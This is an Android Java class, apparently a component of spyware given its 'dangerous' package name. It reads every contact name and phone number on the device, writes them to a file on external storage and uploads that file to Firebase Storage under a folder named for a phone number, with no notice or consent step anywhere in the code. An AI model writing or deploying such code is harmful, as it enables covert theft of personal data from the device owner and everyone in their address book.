package com.rrdreamtech.dangerous.Contact;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.snatik.storage.Storage;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;

public class Contact extends AppCompatActivity {
    String  path;
    Storage storage;
    String newDir;
    FileWriter writer;
    String all;
    File fpath;
    private StorageReference storageRef;
    Context context;
    String number;

  public void Contact(Context context ,String  number){
        this.context=context;
        this.number=number;
        storage=  writeFileOnInternalStorage();
        create(new File(newDir));
        Cursor phones = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            all+=name+"  "+phoneNumber+"\n";
        }
        Writefile(all);
        phones.close();
        upload();

    }


    public Storage writeFileOnInternalStorage(){
        Storage storage = new Storage(context);
        path = storage.getExternalStorageDirectory();
        newDir = path + File.separator + "My Sample Directory";
        storage.createDirectory(newDir);

        return storage;
    }

    public void Writefile(String sBody) {
        try{
            writer.append(sBody);
            writer.flush();
            writer.close();

        }catch (Exception e){
            e.printStackTrace();

        }
    }

    public Writer create(File file) {
        fpath  = new File(file, "comtact.docs");
        try {
            writer = new FileWriter(fpath);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return  writer;
    }


    public void upload() {

        storageRef = FirebaseStorage.getInstance().getReference();
        Uri file = Uri.fromFile(new File(String.valueOf(fpath)));
        StorageReference riversRef = storageRef.child("contact").child(number+"/comtact.docs");
        riversRef.putFile(file)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        // Get a URL to the uploaded content
//                        Uri downloadUrl = taskSnapshot.getDownloadUrl();
                        Log.e("failure ","success");
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        // Handle unsuccessful uploads
                        // ...
                        Log.e("failure ","failure");
                    }
                });
    }
}
